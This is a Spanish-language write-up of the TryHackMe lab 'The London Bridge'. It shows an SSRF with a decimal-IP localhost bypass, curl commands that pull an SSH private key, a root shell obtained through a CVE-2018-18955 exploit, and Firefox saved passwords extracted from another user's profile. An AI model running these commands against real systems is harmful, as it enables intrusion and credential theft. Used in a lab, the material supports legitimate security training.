---
title: The London Bridge TryHackMe Writeup
tags: [writeup, tryhackme, ssrf, bypass, CVE-2018-18955, firefox]
style: border
color: success
description: ""
---

![logo](../assets/img/the_london_bridge-tryhackme-writeup/GYVyj82W0AAmSb4.png)

## Reconocimiento
Lanzamos nmap a todos los puertos, con scripts y versiones de software:
```
> nmap -p- -sVC --min-rate 5000 10.10.110.17 -Pn -n -oN recon/nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 20:43 CEST
Nmap scan report for 10.10.110.17
Host is up (0.067s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp  open     http-proxy gunicorn
|_http-server-header: gunicorn
|_http-title: Explore London
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 28 Sep 2024 18:44:04 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2682
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Explore London</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #f2f2f2;
|     header {
|     background-color: #333;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     background-color: #444;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     color: #fff;
|     text-decoration: none;
|     margin: 0 10p
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 28 Sep 2024 18:44:04 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|_    Content-Length: 0
```
Accedemos al sitio web por el puerto 8080, vemos un sitio web que tiene varios apartados sin terminar, los únicos interesantes son *Gallery* y *Contact*:
![](../assets/img/the_london_bridge-tryhackme-writeup/1.png)

En el apartado *Gallery*, existe una subida de ficheros, estuve un buen rato intentado evadir el sistema de subida de ficheros, pero sin éxito:
![](../assets/img/the_london_bridge-tryhackme-writeup/2.png)

Igualmente, dejé una *PatoPrueba* que refleja claramente mi cara de decepción cuando descubrí que la pista estaba en el código fuente:
![](../assets/img/the_london_bridge-tryhackme-writeup/3.png)

Como dice el principio de la *Navaja de Ockham: la solución más simple suele ser la solución más acertada*:
![](../assets/img/the_london_bridge-tryhackme-writeup/4.png)

Estaba claro que no era coincidencia de que ese comentario estuviera en el apartado de subida de ficheros, como tampoco que los apartados del menú no estuviesen acabados, por lo que intuimos que existen otros apartados ocultos o en desarrollo en el sitio.

Lanzamos la herramienta **wfuzz** con un diccionario de directorios y logramos enumerar el fichero *view_image*:
```python
> wfuzz -c -t 20 --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt "http://10.10.110.17:8080/FUZZ"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.110.17:8080/FUZZ
Total requests: 20116

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000029:   200        59 L     127 W      1703 Ch     "contact"                                                                                                                 
000000088:   405        4 L      23 W       178 Ch      "upload"                                                                                                                  
000000120:   200        56 L     129 W      1816 Ch     "gallery"                                                                                                                 
000000346:   405        4 L      23 W       178 Ch      "feedback"                                                                                                                                                     
000019582:   405        4 L      23 W       178 Ch      "view_image"
```
Cambiamos el tipo de método a *POST* y logramos enumerar un campo para insertar una URL:
![](../assets/img/the_london_bridge-tryhackme-writeup/5.png)

Intentamos probar un *Server-Side Request Forgery (SSRF)*, pero no parece funcionar.

Tras varias pruebas, intentamos *fuzzear* otros parámetros con **wfuzz** y logramos enumerar el parámetro *www* con un código de estado *403*:

```python3
> wfuzz -c -t 20 --hw 67 -X POST --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -d "FUZZ=http://127.0.0.1" "http://10.10.110.17:8080/view_image"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.110.17:8080/view_image
Total requests: 43007

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000536:   403        4 L      30 W       239 Ch      "www"    
```

## Explotación
Tras identificar el parámetro *www*, vemos que el servidor nos permite explotar el *SSRF*:
![](../assets/img/the_london_bridge-tryhackme-writeup/7.png)

Probamos con algúnos de los *Bypass* de *localhost/127.0.0.1* conocidos y logramos evadir la restricción:
```
http://2130706433/
```
![](../assets/img/the_london_bridge-tryhackme-writeup/8.png)

Ejecutamos nuevamente **wfuzz** para enumerar potenciales ficheros y directorios alojados en el servidor, logramos descubrir el directorio *.ssh*:
```python
> wfuzz -c -t 20 --hw 37 -X POST --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -d "www=http://2130706433/FUZZ" "http://10.10.110.17:8080/view_image"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.110.17:8080/view_image
Total requests: 11424

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000061:   200        36 L     161 W      1270 Ch     "index.html"               
000000371:   200        36 L     161 W      1270 Ch     "."                        
000000539:   200        17 L     35 W       474 Ch      ".cache"                   
000002194:   200        16 L     33 W       399 Ch      ".ssh"                     
000003767:   200        117 L    518 W      3771 Ch     ".bashrc"                  
000004134:   200        7 L      35 W       220 Ch      ".bash_logout"             
000004613:   200        0 L      0 W        0 Ch        ".bash_history"
```

Ejecutamos **curl** sobre el fichero *id_rsa*, logrando extraer la clave privada:
```
> curl -s 'http://10.10.110.17:8080/view_image' -d 'www=http://2130706433/.ssh/id_rsa'
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
<SNIP>
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```
Lanzamos **curl** sobre el fichero *authorized_keys*, donde logramos enumerar el usuario *beth*:
```
> curl -s 'http://10.10.110.17:8080/view_image' -d 'www=http://2130706433/.ssh/authorized_keys'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/
<SNIP>
+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

Nos conectamos por **SSH** y con la clave privada (recordemos que hay que darle permisos de solo propietarios con lectura y escritura "*chmod 600 beth-id_rsa*" ;))
```
> ssh beth@10.10.110.17 -i ../files/beth-id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
beth@london:~$ ls -lna
total 72
drwxr-xr-x 11 1000 1000 4096 May  7 06:36 .
drwxr-xr-x  4    0    0 4096 Mar 10  2024 ..
-rw-rw-r--  1 1000 1000 3215 Apr 17 03:44 app.py
lrwxrwxrwx  1    0    0    9 Sep 17  2023 .bash_history -> /dev/null
-rw-r--r--  1 1000 1000  220 Sep 16  2023 .bash_logout
-rw-r--r--  1 1000 1000 3771 Sep 16  2023 .bashrc
drwx------  4 1000 1000 4096 Mar 11  2024 .cache
drwxrwxr-x  6 1000 1000 4096 Sep 17  2023 .env
drwx------  3 1000 1000 4096 Mar 10  2024 .gnupg
-rw-rw-r--  1 1000 1000  328 Apr 17 04:03 gunicorn_config.py
-rw-r--r--  1 1000 1000 1270 Apr 17 05:31 index.html
drwxrwxr-x  5 1000 1000 4096 Mar 11  2024 .local
-rw-r--r--  1 1000 1000  807 Sep 16  2023 .profile
drwxrwxr-x  2 1000 1000 4096 Apr 23 22:15 __pycache__
-rw-rw-r--  1    0    0   66 Sep 18  2023 .selected_editor
drwx------  2 1000 1000 4096 Mar 25  2024 .ssh
drwxrwxr-x  2 1000 1000 4096 Apr 17 05:29 static
-rw-r--r--  1 1000 1000    0 Sep 16  2023 .sudo_as_admin_successful
drwxrwxr-x  2 1000 1000 4096 Apr 17 03:46 templates
drwxrwxr-x  2 1000 1000 4096 Sep 28 09:56 uploads

beth@london:~$ grep -r -i 'THM{'
__pycache__/user.txt:THM{****************}
```

## Escalada de privilegios
En la cabecera de conexión **SSH**, vemos que estamos ante un **Ubuntu 18.04.5 LTS** con *kernel 4.15.0-112-generic*, esta versión está obsoleta y con varios exploits públicos.

Esta comprobación la podemos realizar con scripts como [**linux-exploit-suggester**](https://github.com/The-Z-Labs/linux-exploit-suggester):

```
Possible Exploits:

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled
```

Tras probar varios exploits de los primeros CVEs, conseguimos root explotando el *CVE-2018-18955*:

```
beth@london:/tmp$ chmod +x exploit.dbus.sh 
beth@london:/tmp$ ./exploit.dbus.sh 
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 Sep 28 11:29 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:/tmp# cat /root/
.bash_history     flag.py           .local/           .root.txt         
.bashrc           flag.pyc          .profile          .selected_editor  
.cache/           .gnupg/           __pycache__/      test.py           
root@london:/tmp# cat /root/.root.txt 
THM{**************}
```

## "Robando la cartera" a Charles
Esta máquina tiene una 3ª misión, hay que conseguir la contraseña de Charles!!!

Como ya somos *root*, accedemos a su directorio y encontramos una carpeta de **firefox**, nos llama la atención, ya que es poco habitual y conocido en otras máquinas (Y puede caerte en una conocida certificación guiño, guiño) donde se puede extraer la contraseña en plano del almacen de contraseña del famoso navegador.
```
root@london:/tmp# cd /home/charles/
root@london:/home/charles# ls -lna
total 24
drw------- 3 1001 1001 4096 Apr 23 22:11 .
drwxr-xr-x 4    0    0 4096 Mar 10  2024 ..
lrwxrwxrwx 1    0    0    9 Apr 23 22:11 .bash_history -> /dev/null
-rw------- 1 1001 1001  220 Mar 10  2024 .bash_logout
-rw------- 1 1001 1001 3771 Mar 10  2024 .bashrc
drw------- 3 1001 1001 4096 Mar 16  2024 .mozilla
-rw------- 1 1001 1001  807 Mar 10  2024 .profile
root@london:/home/charles# 
```

Accedemos al directorio **8k3bf3zp.charles** y transferimos a nuestra máquinas los ficheros *logins.json, cert9.db, cookies.sqlite y key4.db*.
```
root@london:/home/charles# cd .mozilla/
root@london:/home/charles/.mozilla# ls -lna
total 12
drw------- 3 1001 1001 4096 Mar 16  2024 .
drw------- 3 1001 1001 4096 Apr 23 22:11 ..
drw------- 3 1001 1001 4096 Mar 16  2024 firefox
root@london:/home/charles/.mozilla# cd firefox/
root@london:/home/charles/.mozilla/firefox# ls -lna
total 12
drw-------  3 1001 1001 4096 Mar 16  2024 .
drw-------  3 1001 1001 4096 Mar 16  2024 ..
drw------- 16 1001 1000 4096 Mar 16  2024 8k3bf3zp.charles
root@london:/home/charles/.mozilla/firefox# 
root@london:/home/charles/.mozilla/firefox/8k3bf3zp.charles# ls -lna
total 12516
drw------- 16 1001 1000    4096 Mar 16  2024 .
drw-------  3 1001 1001    4096 Mar 16  2024 ..
-rw-------  1 1001 1000      24 Mar 16  2024 addons.json
-rw-------  1 1001 1000    5932 Mar 16  2024 addonStartup.json.lz4
-rw-------  1 1001 1000    2177 Mar 16  2024 AlternateServices.txt
drw-------  2 1001 1000    4096 Mar 16  2024 bookmarkbackups
-rw-------  1 1001 1000     221 Mar 16  2024 broadcast-listeners.json
drw-------  3 1001 1000    4096 Mar 16  2024 browser-extension-data
drw-------  4 1001 1000    4096 Mar 16  2024 cache2
-rw-------  1 1001 1000  229376 Mar 16  2024 cert9.db
-rw-------  1 1001 1000     171 Mar 16  2024 compatibility.ini
-rw-------  1 1001 1000     875 Mar 16  2024 containers.json
-rw-------  1 1001 1000  262144 Mar 16  2024 content-prefs.sqlite
-rw-------  1 1001 1000  524288 Mar 16  2024 cookies.sqlite
drw-------  3 1001 1000    4096 Mar 16  2024 crashes
drw-------  3 1001 1000    4096 Mar 16  2024 datareporting
-rw-------  1 1001 1000    1325 Mar 16  2024 extension-preferences.json
-rw-------  1 1001 1000   35107 Mar 16  2024 extensions.json
drw-------  2 1001 1000    4096 Mar 16  2024 extension-store
-rw-------  1 1001 1000 5242880 Mar 16  2024 favicons.sqlite
-rw-------  1 1001 1000  262144 Mar 16  2024 formhistory.sqlite
drw-------  3 1001 1000    4096 Mar 16  2024 gmp-gmpopenh264
-rw-------  1 1001 1000     410 Mar 16  2024 handlers.json
-rw-------  1 1001 1000  294912 Mar 16  2024 key4.db
lrwxrwxrwx  1 1001 1000      16 Mar 16  2024 lock -> 127.0.1.1:+24731
-rw-------  1 1001 1000     703 Mar 16  2024 logins-backup.json
-rw-------  1 1001 1000     645 Mar 16  2024 logins.json
drw-------  2 1001 1000    4096 Mar 16  2024 minidumps
-rw-------  1 1001 1000       0 Mar 16  2024 .parentlock
-rw-------  1 1001 1000   98304 Mar 16  2024 permissions.sqlite
-rw-------  1 1001 1000     468 Mar 16  2024 pkcs11.txt
-rw-------  1 1001 1000 5242880 Mar 16  2024 places.sqlite
-rw-------  1 1001 1000   11342 Mar 16  2024 prefs.js
-rw-------  1 1001 1000   65536 Mar 16  2024 protections.sqlite
drw-------  3 1001 1000    4096 Mar 16  2024 safebrowsing
-rw-------  1 1001 1000     354 Mar 16  2024 search.json.mozlz4
drw-------  2 1001 1000    4096 Mar 16  2024 security_state
-rw-------  1 1001 1000     288 Mar 16  2024 sessionCheckpoints.json
drw-------  2 1001 1000    4096 Mar 16  2024 sessionstore-backups
-rw-------  1 1001 1000    1851 Mar 16  2024 sessionstore.jsonlz4
drw-------  3 1001 1000    4096 Mar 16  2024 settings
-rw-------  1 1001 1000      18 Mar 16  2024 shield-preference-experiments.json
-rw-------  1 1001 1000     638 Mar 16  2024 SiteSecurityServiceState.txt
drw-------  2 1001 1000    4096 Mar 16  2024 startupCache
drw-------  6 1001 1000    4096 Mar 16  2024 storage
-rw-------  1 1001 1000    4096 Mar 16  2024 storage.sqlite
-rw-------  1 1001 1000   32768 Mar 16  2024 storage-sync-v2.sqlite
-rw-------  1 1001 1000   32768 Mar 16  2024 storage-sync-v2.sqlite-shm
-rw-------  1 1001 1000  229576 Mar 16  2024 storage-sync-v2.sqlite-wal
-rw-------  1 1001 1000      50 Mar 16  2024 times.json
-rw-------  1 1001 1000   98304 Mar 16  2024 webappsstore.sqlite
-rw-------  1 1001 1000     141 Mar 16  2024 xulstore.json
```

Una vez transferidos los ficheros necesarios, necesitaremos descargar y ejecutar la herramienta [**firefox_decrypt**](https://github.com/unode/firefox_decrypt):
```
> python firefox_decrypt.py /home/kali/Documents/tlb/exploit
2024-09-28 20:37:01,146 - WARNING - profile.ini not found in /home/kali/Documents/tlb/exploit
2024-09-28 20:37:01,147 - WARNING - Continuing and assuming '/home/kali/Documents/tlb/exploit' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '************'
```
¡Hasta la próxima! ¡Que la "*suerte*" os acompañe!